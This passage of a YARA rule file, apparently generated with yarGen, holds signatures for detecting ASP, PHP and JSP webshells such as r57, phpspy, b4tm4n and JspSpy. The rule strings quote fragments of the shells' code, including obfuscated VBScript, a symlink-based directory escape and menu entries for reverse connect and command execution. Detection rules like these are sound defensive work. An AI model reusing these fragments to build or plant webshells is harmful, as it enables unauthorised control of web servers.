      hash9 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
      hash10 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash11 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash12 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash13 = "f107bfb0bca4900116cad341733919b6138a82c2b2f269da17361703ae57a337"
   strings:
      $s1 = "\":End If:SI=SI&\"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'>\":SI=SI&\"<input name='Action' value='Edi" ascii
      $s2 = "\":End If:SI=SI&\"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'>\":SI=SI&\"<input name='Action' value='Edi" ascii
      $s3 = " Type='hidden'>\":SI=SI&\"<input name='FName' value='\"&Path&\"' style='width:100%'><br>\":SI=SI&\"<textarea name='Content' styl" ascii
      $s4 = "session(\"web2a2dmin\")=UserPass" fullword ascii
      $s5 = "if session(\"web2a2dmin\")<>UserPass then" fullword ascii
      $s6 = "If -2147221005 <> Err Then" fullword ascii
      $s7 = "If Action=\"\" then RRS \" scroll=no\"" fullword ascii
      $s8 = "RRS \"</form><hr/>\"" fullword ascii
      $s9 = " </option>\"" fullword ascii
      $s10 = "Sub InsertAllFiles(Wpath,Wcode,pc)" fullword ascii
      $s11 = "th:100%;height:450'>\"&Txt&\"</textarea><br>\":SI=SI&\"<hr><input name='goback' type='button' value='" fullword ascii
      $s12 = "dim Path,FileName,NewTime,ShuXing" fullword ascii
      $s13 = "</font>]</td></tr>\"" fullword ascii
      $s14 = "RRS \"<option value=''>" fullword ascii
      $s15 = "x m:response.redirect url" fullword ascii
      $s16 = "RRS\"<font color=red>" fullword ascii
      $s17 = "</font> \"&Wpath&myfile.name" fullword ascii
      $s18 = "Set WFSO = Nothing" fullword ascii
      $s19 = "rrs \"<body\" " fullword ascii
      $s20 = "rrs \">\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_4_0_2013110125027897_asp__1___2014_10_23_14_54_16_2014_4_0__1___240 {
   meta:
      description = "webshell - from files asp.asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, 2014.asp, 4.0 (1).asp, asp (1).asp, .asp, 2013.asp, .asp, vps.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash3 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash4 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash5 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash6 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash7 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash8 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash9 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash10 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash11 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash12 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash13 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "EditOOV = EditOOV - 8" fullword ascii
      $s2 = "EditOOV = EditOOV - 128" fullword ascii
      $s3 = "EditOOV = EditOOV - 32" fullword ascii
      $s4 = "EditOOV = EditOOV - 64" fullword ascii
      $s5 = "EditOOV = EditOOV - 16" fullword ascii
      $s6 = "Set FOLD=CF.GetFolder(Path)" fullword ascii
      $s7 = "If EditOOV >= 128 Then" fullword ascii
      $s8 = "If EditOOV >= 1 Then" fullword ascii
      $s9 = "For Each L in Fold.files" fullword ascii
      $s10 = "if EditOOK=0 then" fullword ascii
      $s11 = "EditOOV=l.Attributes" fullword ascii
      $s12 = "If EditOOV >= 4 Then" fullword ascii
      $s13 = "If EditOOV >= 32 Then" fullword ascii
      $s14 = "Dim EditOOK" fullword ascii
      $s15 = "If EditOOV >= 16 Then" fullword ascii
      $s16 = "If EditOOV >= 64 Then" fullword ascii
      $s17 = "End If:If EditOOV >= 8 Then" fullword ascii
      $s18 = "For Each F in FOLD.subfolders" fullword ascii
      $s19 = "EditOOK=1" fullword ascii
      $s20 = "If EditOOV >= 2 Then" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_asp__1___2014_10_23_14_54_16_UnKnown_Vip__1__asp__1__UnKnown_Vip_vps_241 {
   meta:
      description = "webshell - from files asp.asp, asp (1)__2014-10-23-14-54-16.asp, UnKnown Vip (1).asp, asp (1).asp, UnKnown Vip.asp, vps.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash3 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash4 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash5 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash6 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
   strings:
      $s1 = "RRS\"<form name='form1' method='post' action=''>\"" fullword ascii
      $s2 = "Response.Write msg" fullword ascii
      $s3 = "Response.Write \"  <TR>\"" fullword ascii
      $s4 = "Response.Write \"</FONT></TD>\"" fullword ascii
      $s5 = "Response.Write state" fullword ascii
      $s6 = "Response.Write \"  </TR>\"" fullword ascii
      $s7 = "Response.Write \"</P></TD>\"" fullword ascii
      $s8 = "  <TD><FONT color=red>\"" fullword ascii
      $s9 = "  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>\"" fullword ascii
      $s10 = "RRS\"<center>SERV-U" fullword ascii
      $s11 = "  </TABLE>\"" fullword ascii
      $s12 = "Response.Write \"    <TD align=middle bgcolor=#ecfccd>\"" fullword ascii
      $s13 = "  <TD><P>\"" fullword ascii
      $s14 = "RRS SI:" fullword ascii
      $s15 = "RRS\"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>" fullword ascii
      $s16 = "RRS\"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>" fullword ascii
      $s17 = "RRS\"<p><input name='Submit' type='submit' class='buttom' value='" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897_4_0__1_____1__242 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, 4.0 (1).asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash4 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash5 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s2 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s3 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s4 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s5 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" Su---FTP" fullword ascii
      $s6 = "j cdx&\"<a href='?Action=Course' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s7 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" Radmin" fullword ascii
      $s8 = "j cdx&\"<a href='?Action=Servu' target='FileFrame'>\"&cxd&\" Servu-" fullword ascii
      $s9 = "j cdx&\"<a href='?Action=Alexa' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s10 = "j cdx&\"<a href='?Action=php' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s11 = "j cdx&\"<a href='?Action=pcanywhere4' target='FileFrame'>\"&cxd&\" Pcanywhere\"&ef" fullword ascii
      $s12 = "j cdx&\"<a href='javascript:ShowFolder(\"\"\"&RePath(RootPath)&\"\"\")'>\"&cxd&\" " fullword ascii
      $s13 = "></tr><tr><td align=center><table border=0>\"" fullword ascii
      $s14 = "j\"<tr><td onClick=\"\"MM_show('menud')\"\"><input onMouseOver=\"\"this.style.cursor='hand'\"\" type=button value='Disk & Files'" ascii
      $s15 = "r><tr><td height=4></td></tr><tr><td valign=\"\"top\"\" align=center><table border=0  id=menud style=\"\"display='none'\"\">\"" fullword ascii
      $s16 = "j\"<tr><td onClick=\"\"MM_show('menud')\"\"><input onMouseOver=\"\"this.style.cursor='hand'\"\" type=button value='Disk & Files'" ascii
      $s17 = "ton value='Information'></td></tr><tr><td height=4></td></tr><tr><td valign=\"\"top\"\" align=center><table border=0  id=menuc s" ascii
      $s18 = " onClick='history.go(-1);'></br></center>\"" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _indexx_Cmdwebshell_243 {
   meta:
      description = "webshell - from files indexx.asp, Cmdwebshell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
      hash2 = "ee03d95eedaec69608600dc07b35db774c0182e9e60787c4cda9626e4dc0d513"
   strings:
      $s1 = "echo\"<td colspan=\"&span&\" style=\"\"width:\"&width&\"\"\">\"" fullword ascii
      $s2 = "echo\"<td style=\"\"width:\"&width&\"\"\">\"" fullword ascii
      $s3 = "Response.Status=\"401 Unauthorized\"" fullword ascii
      $s4 = "<script language=\"vbscript\">" fullword ascii
      $s5 = ".headSpan{border-top:1px solid #fff;margin:2;background:#e0e0e0;width:100%;}" fullword ascii
      $s6 = ".head td{border-top:1px solid #ccc;border-bottom:1px solid #bbb;background:#e0e0e0;padding:5px 10px 5px 5px;font-weight:bold;}" fullword ascii
      $s7 = "upform.submit()" fullword ascii
      $s8 = "actForm.submit()" fullword ascii
      $s9 = "For Each strPam In pamArr" fullword ascii
      $s10 = "If strFileMethod=\"fso\"Then" fullword ascii
      $s11 = ".focusTr td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ddddff;padding:2px 10px 2px 5px;height:28px}" fullword ascii
      $s12 = "str=Replace(str,Chr(13)&Chr(10),\"<br>\")" fullword ascii
      $s13 = ".alt0 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;height:28px}" fullword ascii
      $s14 = ".link td{border-top:1px solid #fff;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;}" fullword ascii
      $s15 = "echo\"<br></div>\"" fullword ascii
      $s16 = ".alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;height:28px}" fullword ascii
      $s17 = ".bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;padding:3px 5px 5px 5px;}" fullword ascii
      $s18 = "Dim pamArr" fullword ascii
      $s19 = "echo\"<ul class=\"\"info\"\">\"" fullword ascii
      $s20 = "echo\"<input type=\"\"submit\"\" value=\"\"\"&value&\"\"\" class=\"\"bt\"\">\"" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57_Mohajer22_r57_kartal_r57_244 {
   meta:
      description = "webshell - from files r57shell127.php, r57_Mohajer22.php, r57_kartal.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash3 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash4 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "echo \"<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=cen" ascii
      $s2 = "$table_up1  = \"<tr><td bgcolor=#cccccc><font face=Verdana size=-2><b><div align=center>:: \";" fullword ascii
      $s3 = " bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Master Value</b></div></font></td></tr>';" fullword ascii
      $s4 = " echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></di" ascii
      $s5 = "</font></td><td bgcolor=#cccccc><font face=Verdana size=-2>';" fullword ascii
      $s6 = "echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-" ascii
      $s7 = "       if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#ccccc" ascii
      $s8 = "      if(rmdir($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc>" ascii
      $s9 = "echo \"<table width=100% cellpadding=0 cellspacing=0><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-2><div align=cen" ascii
      $s10 = " echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><div align=center><font face=Verda" ascii
      $s11 = "echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><font color=red face=Verdana size=-" ascii
      $s12 = "v></font></td><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Local Value</b></div></font></td><td" ascii
      $s13 = " echo '<table width=100%>', '<tr><td bgcolor=#cccccc><font face=Verdana size=-2 color=red><div align=center><b>Directive</b></di" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Browser_jsp_File_browser_245 {
   meta:
      description = "webshell - from files Browser.jsp, jsp_File_browser.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash2 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
   strings:
      $s1 = "- Description: jsp File browser v1.2 -- This JSP program allows remote web-based" fullword ascii
      $s2 = "59 Temple Place, Suite 330," fullword ascii
      $s3 = "- Credits: Taylor Bastien, David Levine, David Cowan, Lieven Govaerts" fullword ascii
      $s4 = "FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details." fullword ascii
      $s5 = "the terms of the GNU General Public License as published by the" fullword ascii
      $s6 = "Free Software Foundation; either version 2 of the License, or (at your option)" fullword ascii
      $s7 = "Text files can be edited and groups of files and folders can be downloaded" fullword ascii
      $s8 = "any later version." fullword ascii /* Goodware String - occured 1 times */
      $s9 = "This program is distributed in the hope that it will be useful, but" fullword ascii
      $s10 = "Copyright (C) 2003-2006 Boris von Loesch" fullword ascii
      $s11 = "Free Software Foundation, Inc.," fullword ascii
      $s12 = "as a single zip file that's created on the fly." fullword ascii
      $s13 = "Boston, MA 02111-1307 USA" fullword ascii
      $s14 = "jsp File browser 1.2" fullword ascii
      $s15 = "WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or" fullword ascii
      $s16 = "this program; if not, write to the" fullword ascii
      $s17 = "You should have received a copy of the GNU General Public License along with" fullword ascii /* Goodware String - occured 5 times */
      $s18 = "This program is free software; you can redistribute it and/or modify it under" fullword ascii
      $s19 = "file access and manipulation.  You can copy, create, move and delete files." fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_4_0__1__UnKnown_Vip__1__UnKnown_Vip_246 {
   meta:
      description = "webshell - from files 4.0.asp, 4.0 (1).asp, UnKnown Vip (1).asp, UnKnown Vip.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash3 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash4 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
   strings:
      $s1 = "execute(shisanfun(\"bus dne" fullword ascii
      $s2 = ">tpircs<>'" fullword ascii
      $s3 = ",urevreS(rtsnI fi\"))" fullword ascii
      $s4 = "(selbairavrevres.tseuqer=htapf" fullword ascii
      $s5 = " = 1LEEHWs\"))" fullword ascii
      $s6 = "llehsneddih bus\"))" fullword ascii
      $s7 = "copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39)&chr(104)&" ascii
      $s8 = "&ssaPresU&" fullword ascii
      $s9 = "cbb=tpyrcnE" fullword ascii
      $s10 = ")1,)e(tnic,1LEEHWs(dim&cbb=cbb" fullword ascii
      $s11 = "c&cbb=cbb" fullword ascii
      $s12 = "chr(116)&chr(116)&chr(112)&chr(58)&chr(47)&chr(47)&chr(111)&chr(100)&chr(97)&chr(121)&chr(101)&chr(120)&chr(112)&chr(46)&chr(99)" ascii
      $s13 = ",))43(rhC," fullword ascii
      $s14 = ",)edoca(tpyrcnE(ecalper(ecalper(esreveRrtS=nufE" fullword ascii
      $s15 = "1 pets )dca(neL oT 1 = i roF" fullword ascii
      $s16 = ")dca(tpyrcnE noitcnuF" fullword ascii
      $s17 = ",d(ecalper=e" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_r57_Mohajer22_r57_r57_iFX_247 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, r57_Mohajer22.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash5 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "/*  RST/GHC http://rst.void.ru , http://ghc.ru" fullword ascii
      $s2 = "/*  (c)oded by 1dt.w0lf" fullword ascii
      $s3 = "/*                                    #    #          #    #" fullword ascii
      $s4 = "/*                                     ##                 ##" fullword ascii
      $s5 = "/*                                   ###   ############   ###" fullword ascii
      $s6 = "/*                                   ##   ##   ####   ##   ##" fullword ascii
      $s7 = "/*                                   ########################" fullword ascii
      $s8 = "/*                                  ##    #   ######   #    ##" fullword ascii
      $s9 = "/*                                ###   ##  ##########  ##   ###" fullword ascii
      $s10 = "/*                                   ##   #    ####   #    ##" fullword ascii
      $s11 = "/*                                 ###   #  ##########  #   ###" fullword ascii
      $s12 = "/*                                 ###   ##  ########  ##   ###" fullword ascii
      $s13 = "/*                                   ##   ##  ######  ##   ##" fullword ascii
      $s14 = "/*                                    #   ##   ####   ##   #" fullword ascii
      $s15 = "/*                                     #   #          #   #" fullword ascii
      $s16 = "/*                                 ######## ########## #######" fullword ascii
      $s17 = "/*                                        ##############" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_phpspy_2005_full_phpspy_2006_lnc_phpspy_2005_lite_248 {
   meta:
      description = "webshell - from files shell.php, phpspy_2005_full.php, phpspy_2006.php, lnc.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash2 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash3 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash4 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash5 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s2 = "header('Content-Length: '.filesize($downfile));" fullword ascii
      $s3 = ".smlfont {" fullword ascii
      $s4 = "$a=@is_dir($filepath);" fullword ascii
      $s5 = "$ctime=@date(\"Y-m-d H:i:s\",@filectime($filepath));" fullword ascii
      $s6 = "$size= @number_format($size, 3);" fullword ascii
      $s7 = "  <td colspan=\"6\" height=\"5\"></td>" fullword ascii
      $s8 = "$mtime=@date(\"Y-m-d H:i:s\",@filemtime($filepath));" fullword ascii
      $s9 = "echo ($result) ? \"SQL" fullword ascii
      $s10 = "echo \"  <td nowrap colspan=\\\"6\\\" style=\\\"padding-left: 5px;\\\"><a href=\\\"?dir=\".urlencode($dir).\"/\".urlencode($file" ascii
      $s11 = "$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);" fullword ascii
      $s12 = "$filename=\"$editfilename\";" fullword ascii
      $s13 = ".redfont {" fullword ascii
      $s14 = "@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);" fullword ascii
      $s15 = "$size=@filesize($filepath);" fullword ascii
      $s16 = "<tr bgcolor=\"#cccccc\">" fullword ascii
      $s17 = "$filepath=\"$dir/$file\";" fullword ascii
      $s18 = "if($file!=\"..\" && $file!=\".\")" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _v4xGus6X_itsec_249 {
   meta:
      description = "webshell - from files v4xGus6X.php, itsec.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
      hash2 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
   strings:
      $s1 = "mkdir($fakedir);" fullword ascii
      $s2 = "@unlink(\"fakesymlink\");" fullword ascii
      $s3 = "@rmdir(\"fakesymlink\");" fullword ascii
      $s4 = "mkdir(\"fakesymlink\");" fullword ascii
      $s5 = "if(!file_exists($fakedir))" fullword ascii
      $s6 = "@symlink(str_repeat($fakedir.\"/\",$fakedep),\"fakesymlink\");" fullword ascii
      $s7 = "chdir($fakedir);" fullword ascii
      $s8 = "else $num++;" fullword ascii
      $s9 = "if(true==(@symlink(\"fakesymlink/\".str_repeat(\"../\",$fakedep-1).$file, \"symlink\".$num))) break;" fullword ascii
      $s10 = "mkdir($hardstyle[$a]);" fullword ascii
      $s11 = "$level=0;" fullword ascii
      $s12 = "if(!is_writable(\".\"))" fullword ascii
      $s13 = "chdir($hardstyle[$a]);" fullword ascii
      $s14 = "while($as--)" fullword ascii
      $s15 = "$hardstyle = explode(\"/\", $file);" fullword ascii
      $s16 = "if(!file_exists($hardstyle[$a])) " fullword ascii
      $s17 = "$as++;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _bat_b4tm4n_bat_2_7_bat_250 {
   meta:
      description = "webshell - from files bat_b4tm4n.php, bat_2.7.php, bat.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "591efefbc046698998c618234d7ff702b65a9ef7e12cd74980558fb9d0350e98"
      hash2 = "d0197a3e0134bd5ef63d5a2b7699f6aa8403c94251ff33c88c9d1c2c83c0e335"
      hash3 = "23169d2107567f31b9cde9d04b8a9aeee99c34dc3261c81fd7a897a603ec4606"
   strings:
      $s1 = "[7] Self Script Encryptor !" fullword ascii
      $s2 = "<div id='copyrights'><a href='//github.com/k4mpr3t/b4tm4n'>k4mpr3t</a> &copy; %s</div>" fullword ascii
      $s3 = " * B4TM4N SH3LL is PHP WEBSHELL" fullword ascii
      $s4 = "[Password] sha1(md5('pass'))" fullword ascii
      $s5 = " * Account:" fullword ascii
      $s6 = "[4] PHP Reverse Back Connect" fullword ascii
      $s7 = "[Username] B64E('user')" fullword ascii
      $s8 = "\"mass-tools\"=>array(\"title\"=>\"Mass Tools\",\"ver\"=>\"1.0\",\"auth\"=>\"k4mpr3t\")," fullword ascii
      $s9 = "if(!any(\"action\",$_SESSION))" fullword ascii
      $s10 = "$x_=\"zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a\";" fullword ascii
      $s11 = "[5] Run PHP Code" fullword ascii
      $s12 = "[2] Simply Database" fullword ascii
      $s13 = "[0] File Manager" fullword ascii
      $s14 = "[3] Interactive terminal" fullword ascii
      $s15 = "if($z==\"mass-tools\")" fullword ascii
      $s16 = "[6] Custom Toolz" fullword ascii
      $s17 = "42b378d7eb719b4ad9c908601bdf290d541c9c3a" ascii
      $s18 = "[1] Sec. Info" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _he1p_1_nogfw_JspSpy1_ok_style_251 {
   meta:
      description = "webshell - from files he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, ok.jsp, style.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash2 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash3 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash4 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash5 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash6 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
   strings:
      $s1 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s2 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?\"/\":currentRoot.getPath())+\"&quot; total \"+Ut" ascii
      $s3 = "String execute = request.getParameter(\"execute\");" fullword ascii
      $s4 = "file.setExecutable(true);" fullword ascii
      $s5 = "file.setExecutable(false);" fullword ascii
      $s6 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s7 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword ascii
      $s8 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword ascii
      $s9 = "if (Util.isEmpty(execute)) {" fullword ascii
      $s10 = "ze(currentRoot.getTotalSpace(),'G')+\"</h2>\");" fullword ascii
      $s11 = "String read = request.getParameter(\"read\");" fullword ascii
      $s12 = "file.setReadable(true);" fullword ascii
      $s13 = "file.setReadable(false);" fullword ascii
      $s14 = "String write = request.getParameter(\"write\");" fullword ascii
      $s15 = "if (Util.isEmpty(read)) {" fullword ascii
      $s16 = "file.setWritable(false);" fullword ascii
      $s17 = "file.setWritable(true);" fullword ascii
      $s18 = "if (Util.isEmpty(write)) {" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _wsAddAllContainer_wscmd_252 {
   meta:
      description = "webshell - from files wsAddAllContainer.jsp, wscmd.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
